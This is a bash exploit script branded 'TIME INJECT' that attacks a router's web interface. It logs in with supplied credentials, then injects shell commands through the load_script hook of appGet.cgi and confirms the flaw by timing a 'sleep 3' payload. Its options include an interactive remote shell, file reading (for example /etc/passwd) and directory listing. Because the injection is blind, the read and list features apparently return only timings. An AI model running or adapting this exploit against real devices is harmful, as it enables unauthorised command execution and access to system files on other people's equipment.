#!/bin/bash

print_logo() {
    echo -e """
████████╗██╗███╗░░░███╗███████╗
╚══██╔══╝██║████╗░████║██╔════╝
░░░██║░░░██║██╔████╔██║█████╗░░
░░░██║░░░██║██║╚██╔╝██║██╔══╝░░
░░░██║░░░██║██║░╚═╝░██║███████╗
░░░╚═╝░░░╚═╝╚═╝░░░░░╚═╝╚══════╝

██╗███╗░░██╗░░░░░██╗███████╗░█████╗░████████╗
██║████╗░██║░░░░░██║██╔════╝██╔══██╗╚══██╔══╝
██║██╔██╗██║░░░░░██║█████╗░░██║░░╚═╝░░░██║░░░
██║██║╚████║██╗░░██║██╔══╝░░██║░░██╗░░░██║░░░
██║██║░╚███║╚█████╔╝███████╗╚█████╔╝░░░██║░░░
╚═╝╚═╝░░╚══╝░╚════╝░╚══════╝░╚════╝░░░░╚═╝░░░
"""
}

RunCommand() {
    cmd=$1
    login_cookie=$2
    target=$3
    payload="../bin/echo && (${cmd})"
    encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))")
    start_time=$(date +%s%N)
    response=$(curl -s -b "$login_cookie" "$target/appGet.cgi?hook=load_script(${encoded_payload})")
    end_time=$(date +%s%N)
    elapsed_time=$((($end_time - $start_time) / 1000000))
    echo $elapsed_time
}

ConnectionTest() {
    target=$1
    response=$(curl -s -o /dev/null -w "%{http_code}" "$target")
    if [ "$response" -eq 200 ]; then
        return 0
    else
        return 1
    fi
}

GetLoginSession() {
    user=$1
    password=$2
    target=$3
    login_authorization=$(echo -n "${user}:${password}" | base64)
    cookie=$(curl -s -c - "$target/login.cgi" -d "group_id=&action_mode=&action_script=&action_wait=5&current_page=Main_Login.asp&next_page=index.asp&login_authorization=$login_authorization" | grep -o 'Set-Cookie: \([^;]*\)' | sed 's/Set-Cookie: //')
    if [[ -z "$cookie" ]]; then
        return 1
    else
        echo "$cookie"
        return 0
    fi
}

CheckExploitPage() {
    target=$1
    cookie=$2
    response=$(curl -s -b "$cookie" "$target/appGet.cgi?hook=load_script('')")
    if [[ "$response" == "{\n\"load_script(\"\")\":\"\"\n}\n" ]]; then
        return 0
    else
        return 1
    fi
}

CheckVulnerabilities() {
    target=$1
    cookie=$2
    ExecuteTime=$(RunCommand "sleep 3" "$cookie" "$target")
    if [ "$ExecuteTime" -ge 3000 ]; then
        return 0
    else
        return 1
    fi
}

FileRead() {
    file_path=$1
    cookie=$2
    target=$3
    response=$(RunCommand "cat ${file_path}" "$cookie" "$target")
    echo "$response"
}

DirectoryList() {
    directory=$1
    cookie=$2
    target=$3
    response=$(RunCommand "ls -l ${directory}" "$cookie" "$target")
    echo "$response"
}

RunRemoteShell() {
    cookie=$1
    target=$2
    echo "Entering interactive shell. Type 'quit' to exit."
    while true; do
        read -p "shell> " cmd
        if [ "$cmd" == "quit" ]; then
            break
        fi
        echo "Command execution time: $(RunCommand "$cmd" "$cookie" "$target") seconds"
    done
}

print_help() {
    echo -e """
Usage:
    bash $0 [target] [user] [password] [options]

Options:
    -h, --help             Show this help message
    --shell                Start an interactive shell
    --check                Check for vulnerabilities
    --read-file            Read a file from the target system
    --list-dir             List files in a directory on the target system

Examples:
    Check for vulnerabilities:
        bash $0 http://192.168.1.1 admin password --check

    Start an interactive shell:
        bash $0 http://192.168.1.1 admin password --shell

    Read a file:
        bash $0 http://192.168.1.1 admin password --read-file /etc/passwd

    List a directory:
        bash $0 http://192.168.1.1 admin password --list-dir /var/www
"""
}

main() {
    print_logo
    if [ "$#" -lt 3 ]; then
        print_help
        exit 0
    fi

    Target=$1
    User=$2
    Password=$3

    LoginCookie=$(GetLoginSession "$User" "$Password" "$Target")
    if [ -z "$LoginCookie" ]; then
        echo "[-] Login failed. Please check credentials."
        exit 1
    fi

    if [ "$#" -gt 3 ]; then
        case $4 in
            -h|--help)
                print_help
                ;;
            --check)
                echo "[*] Checking vulnerabilities..."
                if ! ConnectionTest "$Target"; then
                    echo "[-] Unable to connect to target."
                    exit 1
                fi
                if ! CheckExploitPage "$Target" "$LoginCookie"; then
                    echo "[-] Exploit page does not exist."
                    exit 1
                fi
                if CheckVulnerabilities "$Target" "$LoginCookie"; then
                    echo "[+] Vulnerability detected."
                else
                    echo "[-] No vulnerability detected."
                    exit 1
                fi
                ;;
            --shell)
                RunRemoteShell "$LoginCookie" "$Target"
                ;;
            --read-file)
                if [ "$#" -lt 5 ]; then
                    echo "Error: Missing file path for reading."
                    print_help
                    exit 1
                fi
                FileRead "$5" "$LoginCookie" "$Target"
                ;;
            --list-dir)
                if [ "$#" -lt 5 ]; then
                    echo "Error: Missing directory path for listing."
                    print_help
                    exit 1
                fi
                DirectoryList "$5" "$LoginCookie" "$Target"
                ;;
            *)
                echo "Unknown option: $4"
                print_help
                exit 1
                ;;
        esac
    else
        echo "[*] Checking vulnerabilities..."
        if ! ConnectionTest "$Target"; then
            echo "[-] Unable to connect to target."
            exit 1
        fi
        if ! CheckExploitPage "$Target" "$LoginCookie"; then
            echo "[-] Exploit page does not exist."
            exit 1
        fi
        if CheckVulnerabilities "$Target" "$LoginCookie"; then
            echo "[+] Vulnerability detected."
        else
            echo "[-] No vulnerability detected."
            exit 1
        fi
    fi
}

main "$@"
